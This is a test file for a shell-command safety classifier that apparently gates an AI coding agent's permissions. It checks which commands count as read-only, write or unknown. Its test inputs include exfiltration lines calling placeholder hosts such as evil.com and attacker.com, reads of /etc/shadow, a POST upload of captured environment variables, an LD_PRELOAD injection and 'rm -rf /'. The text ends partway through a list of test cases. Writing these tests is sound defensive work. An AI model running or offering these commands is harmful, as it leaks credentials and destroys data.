/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */

import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import {
  classifyShellCommandSafety,
  initParser,
  isShellCommandReadOnlyAST,
  extractCommandRules,
  _resetParser,
  _setParserFailedForTesting,
} from './shellAstParser.js';
import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';

beforeAll(async () => {
  await initParser();
});

afterAll(() => {
  _resetParser();
});

// =========================================================================
// isShellCommandReadOnlyAST — mirror all tests from shellReadOnlyChecker.test.ts
// =========================================================================

describe('isShellCommandReadOnlyAST', () => {
  it('allows simple read-only command', async () => {
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('rejects mutating commands like rm', async () => {
    expect(await isShellCommandReadOnlyAST('rm -rf temp')).toBe(false);
  });

  it('rejects redirection output', async () => {
    expect(await isShellCommandReadOnlyAST('ls > out.txt')).toBe(false);
  });

  it('rejects command substitution', async () => {
    expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
  });

  // Regression coverage for PR #4386 round 4: the AST walker previously
  // only checked substitution inside the `command` node type, missing it
  // inside `variable_assignment` (e.g. `FOO=$(curl evil)`) and inside
  // `redirected_statement`'s redirect target (e.g. `cat < $(curl evil)`).
  // Pre-PR #4386, a regex check in `resolveDefaultPermission` was a
  // safety net masking these AST gaps; removing that check exposed the
  // gaps as a security regression (substitution-bearing commands
  // silently classified read-only → `'allow'`).
  describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
    it('rejects substitution inside variable_assignment', async () => {
      expect(
        await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)'),
      ).toBe(false);
    });

    it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(
        false,
      );
    });

    it('rejects substitution inside a read redirect target', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'cat < $(curl attacker.com/path-source)',
        ),
      ).toBe(false);
    });

    it('rejects backtick substitution inside variable_assignment', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(
        false,
      );
    });
  });

  it('allows git status but rejects git commit', async () => {
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
    expect(await isShellCommandReadOnlyAST('git commit -am "msg"')).toBe(false);
  });

  it('rejects find with exec', async () => {
    expect(await isShellCommandReadOnlyAST('find . -exec rm {} \\;')).toBe(
      false,
    );
  });

  it('rejects sed in-place', async () => {
    expect(await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file")).toBe(
      false,
    );
  });

  it('rejects empty command', async () => {
    expect(await isShellCommandReadOnlyAST('   ')).toBe(false);
  });

  it('rejects environment prefix followed by allowed command', async () => {
    expect(await isShellCommandReadOnlyAST('FOO=bar ls')).toBe(false);
  });

  describe('multi-command security', () => {
    it('rejects commands separated by newlines (CVE-style attack)', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\ncurl evil.com',
        ),
      ).toBe(false);
    });

    it('rejects commands separated by Windows newlines', async () => {
      expect(
        await isShellCommandReadOnlyAST('grep pattern file\r\ncurl evil.com'),
      ).toBe(false);
    });

    it('rejects newline-separated commands when any is mutating', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
        ),
      ).toBe(false);
    });

    it('allows chained read-only commands with &&', async () => {
      expect(await isShellCommandReadOnlyAST('ls && cat file')).toBe(true);
    });

    it('allows chained read-only commands with ||', async () => {
      expect(await isShellCommandReadOnlyAST('ls || cat file')).toBe(true);
    });

    it('allows chained read-only commands with ;', async () => {
      expect(await isShellCommandReadOnlyAST('ls ; cat file')).toBe(true);
    });

    it('allows piped read-only commands with |', async () => {
      expect(await isShellCommandReadOnlyAST('ls | cat')).toBe(true);
    });

    it('allows backgrounded read-only commands with &', async () => {
      expect(await isShellCommandReadOnlyAST('ls & cat file')).toBe(true);
    });

    it('rejects chained commands when any is mutating', async () => {
      expect(await isShellCommandReadOnlyAST('ls && rm -rf /')).toBe(false);
      expect(await isShellCommandReadOnlyAST('cat file | curl evil.com')).toBe(
        false,
      );
      expect(await isShellCommandReadOnlyAST('ls ; apt install foo')).toBe(
        false,
      );
    });

    it('allows single read-only command without chaining', async () => {
      expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    });

    it('rejects single mutating command (baseline check)', async () => {
      expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
    });

    it('treats escaped newline as line continuation (single command)', async () => {
      expect(await isShellCommandReadOnlyAST('grep pattern\\\nfile')).toBe(
        true,
      );
    });

    it('allows consecutive newlines with all read-only commands', async () => {
      expect(await isShellCommandReadOnlyAST('ls\n\ngrep foo')).toBe(true);
    });
  });

  describe('awk command security', () => {
    it('allows safe awk commands', async () => {
      expect(await isShellCommandReadOnlyAST("awk '{print $1}' file.txt")).toBe(
        true,
      );
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {print "hello"}\''),
      ).toBe(true);
      expect(
        await isShellCommandReadOnlyAST("awk '/pattern/ {print}' file.txt"),
      ).toBe(true);
    });

    it('rejects awk with system() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {system("rm -rf /")}\' '),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{system("touch file")}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects awk with file output redirection', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print > "output.txt"}\' input.txt',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print >> "append.txt"}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects awk with command pipes', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'{print | "sort"}\' input.txt'),
      ).toBe(false);
    });

    it('rejects awk with getline from commands', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {getline < "date"}\''),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {"date" | getline}\''),
      ).toBe(false);
    });

    it('rejects awk with close() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {close("file")}\''),
      ).toBe(false);
    });
  });

  describe('sed command security', () => {
    it('allows safe sed commands', async () => {
      expect(await isShellCommandReadOnlyAST("sed 's/foo/bar/' file.txt")).toBe(
        true,
      );
      expect(await isShellCommandReadOnlyAST("sed -n '1,5p' file.txt")).toBe(
        true,
      );
    });

    it('rejects sed with execute command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/e' file.txt"),
      ).toBe(false);
    });

    it('rejects sed with write command', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          "sed 's/foo/bar/w output.txt' file.txt",
        ),
      ).toBe(false);
    });

    it('rejects sed with read command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/r input.txt' file.txt"),
      ).toBe(false);
    });

    it('still rejects sed in-place editing', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file.txt"),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST("sed --in-place 's/foo/bar/' file.txt"),
      ).toBe(false);
    });
  });

  // =======================================================================
  // Additional AST-specific edge cases
  // =======================================================================

  describe('AST-specific edge cases', () => {
    it('rejects backtick command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo `rm -rf /`')).toBe(false);
    });

    it('rejects process substitution with write', async () => {
      // process_substitution is conservatively handled as command_substitution
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('allows pure variable assignment', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('rejects multiple env vars before command', async () => {
      expect(await isShellCommandReadOnlyAST('A=1 B=2 ls -la')).toBe(false);
    });

    it('rejects function definitions', async () => {
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });

    it('allows git diff', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'git diff --word-diff=color -- file.txt',
        ),
      ).toBe(true);
    });

    it('allows git log', async () => {
      expect(await isShellCommandReadOnlyAST('git log --oneline -10')).toBe(
        true,
      );
    });

    it('rejects git push', async () => {
      expect(await isShellCommandReadOnlyAST('git push origin main')).toBe(
        false,
      );
    });

    it('allows git --version / --help', async () => {
      expect(await isShellCommandReadOnlyAST('git --version')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git --help')).toBe(true);
    });

    it('allows input redirection (read-only)', async () => {
      expect(await isShellCommandReadOnlyAST('cat < input.txt')).toBe(true);
    });

    it('rejects append redirection', async () => {
      expect(await isShellCommandReadOnlyAST('echo hello >> out.txt')).toBe(
        false,
      );
    });

    it('allows here-string', async () => {
      expect(await isShellCommandReadOnlyAST('cat <<< "hello"')).toBe(true);
    });

    it('rejects nested command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo $(echo $(rm foo))')).toBe(
        false,
      );
    });

    it('allows complex pipeline of read-only commands', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'find . -name "*.ts" | grep -v node_modules | sort | head -20',
        ),
      ).toBe(true);
    });

    it('rejects pipeline with mutating command', async () => {
      expect(
        await isShellCommandReadOnlyAST('find . -name "*.ts" | xargs rm'),
      ).toBe(false);
    });

    it('allows git branch (no mutating flags)', async () => {
      expect(await isShellCommandReadOnlyAST('git branch')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git branch -a')).toBe(true);
    });

    it('rejects git branch -d', async () => {
      expect(await isShellCommandReadOnlyAST('git branch -d feature')).toBe(
        false,
      );
    });

    it('allows git remote (no mutating action)', async () => {
      expect(await isShellCommandReadOnlyAST('git remote -v')).toBe(true);
    });

    it('rejects git remote add', async () => {
      expect(await isShellCommandReadOnlyAST('git remote add origin url')).toBe(
        false,
      );
    });
  });
});

// =========================================================================
// classifyShellCommandSafety
// =========================================================================

describe('classifyShellCommandSafety', () => {
  it.each([
    'ls -la',
    'git status --short',
    'ls | cat && pwd',
    'FOO=bar',
    'cd /tmp',
    '(git status)',
    '{ ls; pwd; }',
    'cat < input.txt',
    'cat <<EOF\nhello\nEOF',
    'echo 2>&1',
    'echo >&-',
    'uniq input.txt',
    'uniq -- -f',
    'git branch --list --color=always topic',
    'git diff -o patch',
    'git diff -Oorderfile',
    'git log -p',
    'git show -p HEAD',
    'git blame -p file',
    'git log -- --output=log.out',
    'sort -- -o output',
    'tree -- -o output',
    'rg -- -z file',
    'sort -- -roout input',
    'sort -- --output=out',
    "sed -- 's/a/b/' input",
    "sed 's/a/*/' file",
    "sed 's/old/new/' file",
    "sed 's/hello/world/' file",
    "sed 's/error/warning/g' file",
    "sed -n '/needle/p' file",
    "sed '/pattern/d' file",
    "sed 's/a/woutput/' file",
    "sed 's#x#s/a/b/woutput#' file",
    "sed 's#x#foo;woutput#' file",
    "sed 'p;d' file",
    "awk '{ print*2 }' file",
    "awk -- '{ print }' input",
    "awk -F : '{ print $1 }' input",
    "printf '%s' value",
  ])('classifies %j as read-only', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('read-only');
  });

  it.each([
    ...[
      'chgrp',
      'chmod',
      'chown',
      'cp',
      'install',
      'ln',
      'mkdir',
      'mkfifo',
      'mknod',
      'mv',
      'rename',
      'rm',
      'rmdir',
      'shred',
      'touch',
      'truncate',
      'unlink',
    ].map((root) => `${root} target`),
    ...'add am checkout cherry-pick clean clone commit fetch gc init merge mv pull push rebase reset restore revert rm stash switch'
      .split(' ')
      .map((subcommand) => `git ${subcommand} target`),
    'kill 123',
    'kill -- -0',
    'kill "$PID"',
    'pkill -n 0',
    'pkill -n0 process',
    'pkill -s0 process',
    'pkill -s 0 process',
    'pkill -s "$SESSION" process',
    'killall -n0 process',
    'echo > out',
    '> out',
    'export FOO=bar > out',
    'echo >> out',
    'echo >| out',
    'echo &> out',
    'echo &>> out',
    'echo >& out',
    '> out echo',
    'git commit -m message',
    'git commit -m --help',
    'git commit -F --help',
    'git commit -C --help',
    'git commit -c --help',
    'git commit --reuse-message --help',
    'git commit --fixup --help',
    'git commit -m --dry-run',
    'git commit -n -m message',
    "git commit -m '%G?'",
    'git add -- --help',
    'git add -- --dry-run',
    'touch -- --help',
    'git fetch -n origin',
    'git branch topic',
    'git branch -- topic',
    'git branch --color=always color-topic',
    'git branch --column column-topic',
    'git branch --sort=refname sort-topic',
    "git branch --format='%(refname)' format-topic",
    'git branch -v verbose-topic',
    'git branch --delete topic',
    'git branch -uorigin/main topic',
    'git branch --format --help -d topic',
    'git branch --sort --version --delete topic',
    'git remote set-url origin url',
    'git remote rm origin',
    'git remote prune origin',
    'git diff --output=patch',
    'git log --output=log.out',
    'git show --output=show.out HEAD',
    'git log --output --help',
    'find . -delete',
    'find . -fprint matches',
    'find . -fprint --help',
    'find . -fls --help',
    'find . -fprintf --help format',
    'find . -exec rm {} \\;',
    'find . -exec echo --help {} \\; -delete',
    'find . -exec echo --version {} \\; -delete',
    "sed -i 's/a/b/' file",
    'sed -f script.sed -i file',
    'sed --file=script.sed --in-place=.bak file',
    "sed -- 'wout' input",
    "sed -- 's/a/b/wout' input",
    "sed -I .bak 's/a/b/' file",
    "sed -I.bak 's/a/b/' file",
    "sed -ni.bak 's/a/b/' file",
    "sed -nI.bak 's/a/b/' file",
    "sed 's/a/b/w output' file",
    "sed -e 's/a/b/' -e 'woutput' file",
    "sed 's/a/b/woutput' file",
    "sed 'woutput' file",
    "sed '1woutput' file",
    "sed '/pattern/woutput' file",
    "sed 'W output' file",
    "sed '1W output' file",
    "sed 'p;w output' file",
    "sed 's/a/b/;w output' file",
    "sed 's/a/;/;w output' file",
    "sed -l 80 'w output' file",
    "sed --line-length 80 'w output' file",
    'awk \'{ print > "output" }\' file',
    'awk -- \'BEGIN { print > "out" }\'',
    'awk \'BEGIN { print "x" > "out" }\'',
    'awk \'BEGIN { printf "%s", "x" > "out" }\'',
    'awk \'BEGIN { print a[x] > "out" }\'',
    'awk \'{ print>"output" }\' file',
    'awk -v mode=1 \'BEGIN { print > "out" }\' input',
    'awk \'/pattern/ { print > "out" }\' input',
    'sort -o output input',
    'sort -o --help input',
    'tree -o tree.txt',
    'tree -o --help .',
    'uniq input output',
    'uniq - output',
    'uniq -- -f output',
    'uniq input -- -f',
    'tee output',
    'tee -- -output',
    'tee -a -- -output',
    'dd if=input of=output',
    'echo $(rm target)',
    'FOO=$(rm target)',
    'cat <(rm target)',
    'cat < <(rm target)',
    '< <(rm target) cat',
    '! rm target',
    'cat <<EOF\n$(rm target)\nEOF',
    'FOO=bar rm target',
    'python -c pass; touch target',
    'if true; then rm target; fi',
    'while false; do rm target; done',
    'for item in value; do rm target; done',
  ])('classifies %j as write', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('write');
  });

  it.each([
    '',
    'python -c pass',
    'node -e pass',
    'LS -la',
    'printf -v PATH /tmp',
    'printf -xv PATH /tmp',
    'printf "$OPTIONS" value',
    'printf -v PATH /tmp; ls',
    'sudo ls',
    'bash -c ls',
    '/bin/rm target',
    'rm --help',
    'kill -0 123',
    'kill -n 0 123',
    'kill -n 00 123',
    'kill -n0 123',
    'kill -s0 123',
    'kill --signal 0 123',
    'kill -SIG0 123',
    'kill -s SIG0 123',
    'kill --signal=SIG0 123',
    'kill -l',
    'kill --list=TERM',
    'kill --table',
    'kill -V',
    'killall -help',
    'killall -s0 process',
    'killall -sSIG0 process',
    'pkill -0 process',
    'pkill -SIG0 process',
    'pkill --signal 0 process',
    'pkill --signal SIG0 process',
    'kill -s "$SIGNAL" 123',
    'kill -n "$SIGNAL" 123',
    'kill --signal="$SIGNAL" 123',
    'git clean --dry-run',
    'git commit -m -F --help',
    'git commit -m -F --dry-run',
    'git commit --message --file --help',
    'git commit --untracked-files --help',
    'git --config-env=diff.external=HELPER diff',
    'git --paginate log',
    'git -p log',
    'git --unknown-option status',
    'git -- status',
    'git --help commit',
    'git status --help',
    'git log --help',
    'git diff --help',
    'git log --show-signature -1',
    'git show --format=%G? HEAD',
    'GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    'FOO=bar GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    "GIT_EXTERNAL_DIFF='touch /tmp/pwned'; git diff",
    'FOO=bar; ls',
    'FOO=bar ls',
    'LD_PRELOAD=/tmp/evil.so ls',
    'RIPGREP_CONFIG_PATH=/tmp/config rg pattern',
    'PAGER=helper git log',
    'git add -n target',
    'git branch -d topic --help',
    'git branch --list -- -d',
    'git branch -- --list',
    'git branch --sort refname',
    "git branch --format '%(refname)'",
    'git branch --sort refname topic',
    'git branch --format --delete',
    'git branch --sort -d',
    'git diff --output=',
    'git blame --output=blame.out file',
    'git diff --ext-diff',
    'git show --textconv HEAD:file',
    'git grep --open-files-in-pager=less needle',
    'git grep -Ovim needle',
    'git cat-file --filters HEAD:file',
    'git remote prune --dry-run origin',
    'git remote prune -n origin',
    'git remote show remove',
    'git remote get-url prune',
    'find . -exec echo {} \\;',
    'find . -exec echo -delete \\;',
    'find . -fprint --help --help',
    'find . -name -delete',
    'find . -printf -delete',
    'find . -newermt -delete',
    'find . -samefile -delete',
    'find . -mtime -delete',
    'find . -used -delete',
    'find . -- -delete',
    'find . -exec rm --help \\;',
    'sed -f script.sed file',
    'sed -fscript.sed file',
    "sed --in-pl=.bak 's/a/b/' file",
    'sed --f script.sed file',
    'sed -newout input',
    'sed -nEewout input',
    'sed "$SCRIPT" file',
    'sed -e "$SCRIPT" file',
    'sed s/a/*/ file',
    'sed \'s/a/b/\' "$FILE"',
    "sed -i 's/a/b/' --help",
    'sed -e -i file',
    'sed -einstall file',
    'sed -neinstall file',
    "sed -e '' file",
    'sed -f -i file',
    'sed -e-i file',
    'sed -- -i file',
    "sed 's/a/b/e' file",
    "sed 's/a/printf hacked > marker/ep' file",
    "sed 's#a#printf hacked > marker#pe' file",
    "sed 'etouch marker' file",
    "sed '1etouch marker' file",
    "sed 's/a/b/w' file",
    "sed 'w' file",
    "sed '1w' file",
    "sed 'R input' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/a/new value/' file",
    "sed 's/a/blue sky/' file",
    "sed 's/a/car value/' file",
    "sed 's/w /x/' file",
    "sed '/p;w output/p' file",
    "sed 's/a/;w output/' file",
    'awk \'{ system("date") }\'',
    "awk '{ print > output }' file",
    'awk \'BEGIN { print("x")|"cat > output" }\'',
    'awk \'BEGIN { print(1 > "0") }\'',
    'awk \'BEGIN { printf("%d", 1 > "0") }\'',
    'awk \'BEGIN { print "print > " "output" }\'',
    'awk \'BEGIN { print (x) > "out" }\'',
    'awk \'BEGIN { print +(x > "0") }\'',
    'awk \'BEGIN { print a[x > "0"] }\'',
    'awk \'BEGIN { # print > "out"\nprint }\'',
    'awk \'BEGIN { print /x; print y > "out";/ }\'',
    'awk \'BEGIN { print x / 2 > "out" }\'',
    "awk '{ print }' 'print > \"out\"'",
    'awk -fscript.awk file',
    'awk -W exec=script.awk file',
    'awk -Wexec=script.awk file',
    'awk "$PROGRAM" file',
    'awk \'@include "library.awk"\' file',
    "awk -e '{ print }' file",
    "awk --load extension '{ print }' file",
    "awk --profile=report '{ print }' file",
    'awk {print*2} file',
    'awk -v x="$VALUE" \'{ print x }\' file',
    'awk \'{ print $NF }\' "$FILE"',
    'uniq *',
    'uniq "$FILES"',
    'sort "$OPTIONS" input',
    'sort {-o,output} input',
    'sort --out=output input',
    'sort -roout input',
    'tree -Cofile .',
    'sort --co=cat input',
    'tree --output=tree.txt',
    'find . "$EXPRESSION"',
    'rg "$OPTIONS" pattern',
    'git status "$OPTIONS"',
    'sort --compress-program gzip input',
    'sort --output=',
    'sort -o output --help',
    'rg --pre cat pattern',
    'rg --hostname-bin=hostname pattern',
    'rg -z pattern archive.gz',
    'ripgrep -iz pattern archive.gz',
    'rg --search-zip pattern archive.gz',
    'less file',
    'more file',
    'tee',
    'dd if=input',
    'echo >& "$target"',
    'cat <> file',
    'echo >',
    'FOO=bar > out',
    'echo $(git status)',
    'FOO=$(git status)',
    'cat <(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
  ])('classifies %j as unknown', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it.each([
    'rm target',
    'python -c pass',
    'echo $(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
    'git push origin main',
    'git branch --list -- -d',
    'find . -exec echo {} \\;',
    "sed 's/a/b/e' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/w /x/' file",
    'awk \'{ system("date") }\'',
    'git remote show remove',
  ])('does not widen the compatibility boolean for %j', async (command) => {
    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
  });

  it('classifies deeply nested substitutions without repeated traversal', async () => {
    let command = 'git status';
    for (let depth = 0; depth < 30; depth++) command = `echo $(${command})`;
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it('classifies deeply nested redirected substitutions without repeated traversal', async () => {
    const commands = ['git status', 'git status'];
    for (let depth = 0; depth < 20; depth++) {
      commands[0] = `echo $(${commands[0]}) < /dev/null`;
      commands[1] = `< <(${commands[1]}) cat`;
    }
    const startedAt = performance.now();
    await expect(
      Promise.all(commands.map(classifyShellCommandSafety)),
    ).resolves.toEqual(['unknown', 'unknown']);
    expect(performance.now() - startedAt).toBeLessThan(1000);
  });

  it('classifies adversarial rule inputs in bounded time', async () => {
    const backslashes = '\\'.repeat(10_000);
    const repeatedSed = 'p;'.repeat(10_000);
    const repeatedPrint = 'print value; '.repeat(10_000);
    const repeatedFindExec = '-exec echo \\; '.repeat(10_000);
    const unmatchedBraces = '\\{'.repeat(10_000);
    const commands = [
      `sed 's/${backslashes}a' file`,
      `sed '${repeatedSed}' file`,
      `awk 'BEGIN { print "${backslashes} > output }'`,
      `awk 'BEGIN { ${repeatedPrint} }'`,
      `find . ${repeatedFindExec}`,
      `git status ${unmatchedBraces}`,
    ];
    const startedAt = performance.now();
    await expect(
      Promise.all(commands.map(classifyShellCommandSafety)),
    ).resolves.toEqual([
      'unknown',
      'read-only',
      'unknown',
      'read-only',
      'unknown',
      'read-only',
    ]);
    expect(performance.now() - startedAt).toBeLessThan(1000);
  });
});

// =========================================================================
// extractCommandRules
// =========================================================================

describe('extractCommandRules', () => {
  describe('simple commands', () => {
    it('extracts root + known subcommand + wildcard', async () => {
      expect(
        await extractCommandRules('git clone https://github.com/foo/bar.git'),
      ).toEqual(['git clone *']);
    });

    it('extracts npm install with wildcard', async () => {
      expect(await extractCommandRules('npm install express')).toEqual([
        'npm install *',
      ]);
    });

    it('extracts npm outdated without wildcard (no extra args)', async () => {
      expect(await extractCommandRules('npm outdated')).toEqual([
        'npm outdated',
      ]);
    });

    it('extracts cat with wildcard', async () => {
      expect(await extractCommandRules('cat /etc/passwd')).toEqual(['cat *']);
    });

    it('extracts ls with wildcard', async () => {
      expect(await extractCommandRules('ls -la /tmp')).toEqual(['ls *']);
    });

    it('extracts bare command without args', async () => {
      expect(await extractCommandRules('whoami')).toEqual(['whoami']);
    });

    it('extracts unknown command with wildcard', async () => {
      expect(await extractCommandRules('curl https://example.com')).toEqual([
        'curl *',
      ]);
    });

    it('extracts command with only flags', async () => {
      expect(await extractCommandRules('ls -la')).toEqual(['ls *']);
    });
  });

  describe('compound commands', () => {
    it('extracts rules from && compound', async () => {
      expect(await extractCommandRules('git clone foo && npm install')).toEqual(
        ['git clone *', 'npm install'],
      );
    });

    it('extracts rules from || compound', async () => {
      expect(await extractCommandRules('git pull || git fetch origin')).toEqual(
        ['git pull', 'git fetch *'],
      );
    });

    it('extracts rules from ; compound', async () => {
      expect(await extractCommandRules('ls ; cat file')).toEqual([
        'ls',
        'cat *',
      ]);
    });

    it('extracts rules from pipeline', async () => {
      expect(await extractCommandRules('cat file | grep pattern')).toEqual([
        'cat *',
        'grep *',
      ]);
    });

    it('deduplicates rules', async () => {
      expect(
        await extractCommandRules('npm install foo && npm install bar'),
      ).toEqual(['npm install *']);
    });
  });

  describe('docker multi-level subcommands', () => {
    it('extracts docker compose up with args', async () => {
      expect(await extractCommandRules('docker compose up -d')).toEqual([
        'docker compose up *',
      ]);
    });

    it('extracts docker compose up without args', async () => {
      expect(await extractCommandRules('docker compose up')).toEqual([
        'docker compose up',
      ]);
    });

    it('extracts docker run with wildcard', async () => {
      expect(await extractCommandRules('docker run -it ubuntu bash')).toEqual([
        'docker run *',
      ]);
    });
  });

  describe('edge cases', () => {
    it('returns empty for empty string', async () => {
      expect(await extractCommandRules('')).toEqual([]);
    });

    it('returns empty for whitespace', async () => {
      expect(await extractCommandRules('   ')).toEqual([]);
    });

    it('handles env var prefix', async () => {
      expect(await extractCommandRules('FOO=bar npm install')).toEqual([
        'npm install',
      ]);
    });

    it('handles redirected command', async () => {
      expect(await extractCommandRules('echo hello > out.txt')).toEqual([
        'echo *',
      ]);
    });

    it('handles pure variable assignment (no rule)', async () => {
      expect(await extractCommandRules('FOO=bar')).toEqual([]);
    });

    it('extracts cargo subcommands', async () => {
      expect(await extractCommandRules('cargo build --release')).toEqual([
        'cargo build *',
      ]);
    });

    it('extracts kubectl subcommands', async () => {
      expect(await extractCommandRules('kubectl get pods -n default')).toEqual([
        'kubectl get *',
      ]);
    });

    it('extracts pip install', async () => {
      expect(await extractCommandRules('pip install requests')).toEqual([
        'pip install *',
      ]);
    });

    it('extracts pnpm subcommands', async () => {
      expect(await extractCommandRules('pnpm add -D typescript')).toEqual([
        'pnpm add *',
      ]);
    });
  });
});
// =========================================================================
// Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
// =========================================================================

describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
  afterEach(() => {
    _resetParser();
  });

  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    // Both implementations agree: ls is read-only
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('maps parser unavailability to unknown in the classification API', async () => {
    _setParserFailedForTesting();
    expect(await classifyShellCommandSafety('git status')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
  });

  it('treats syntax errors as unknown without widening the boolean API', async () => {
    expect(isShellCommandReadOnly('ls |')).toBe(false);
    expect(await classifyShellCommandSafety('ls |')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('ls |')).toBe(false);
  });

  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });

  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
  });

  it('returns regex result for write-redirection command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
  });

  it('fallback result matches direct regex call', async () => {
    _setParserFailedForTesting();
    const commands = [
      'ls -la',
      'rm -rf /',
      'git status',
      'git push origin main',
      'cat file | grep pattern',
      'echo hello > out.txt',
      'find . -name "*.ts"',
      'find . -exec rm {} \\;',
      "sed -i 's/a/b/' file",
      'FOO=bar ls',
    ];
    for (const cmd of commands) {
      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
        isShellCommandReadOnly(cmd),
      );
    }
  });

  it('re-initialises normally after _resetParser', async () => {
    _setParserFailedForTesting();
    _resetParser();
    await initParser(); // should succeed
    // After reset, AST parser is used again
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });
});

// =========================================================================
// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
//
// Both implementations must agree on all cases in this suite.
// Cases where a known, intentional divergence exists are labelled with
// [divergence] and include an explanation.
// =========================================================================

describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
  // Pairs of [command, expected] where BOTH implementations must return the
  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
    // --- basics ---
    ['ls -la', true],
    ['rm -rf temp', false],
    ['ls > out.txt', false],
    ['echo $(touch file)', false],
    ['echo `rm -rf /`', false, 'backtick substitution'],

    // --- git ---
    ['git status', true],
    ['git log --oneline -10', true],
    ['git diff --word-diff=color -- file.txt', true],
    ['git commit -am "msg"', false],
    ['git push origin main', false],
    ['git branch', true],
    ['git branch -d feature', false],
    ['git remote -v', true],
    ['git remote add origin url', false],
    ['git --version', true],

    // --- find ---
    ['find . -name "*.ts"', true],
    ['find . -exec rm {} \\;', false],
    ['find . -execdir ls {} \\;', false],
    ['find . -delete', false],

    // --- sed ---
    ["sed 's/foo/bar/' file.txt", true],
    ["sed -n '1,5p' file.txt", true],
    ["sed -i 's/foo/bar/' file.txt", false],
    ["sed --in-place 's/foo/bar/' file.txt", false],
    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
    ["sed 'e date' file.txt", false],
    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
    ["sed 'w backup.txt' file.txt", false],
    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
    ["sed 'r header.txt' file.txt", false],

    // --- awk ---
    ["awk '{print $1}' file.txt", true],
    ['awk \'BEGIN {print "hello"}\'', true],
    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
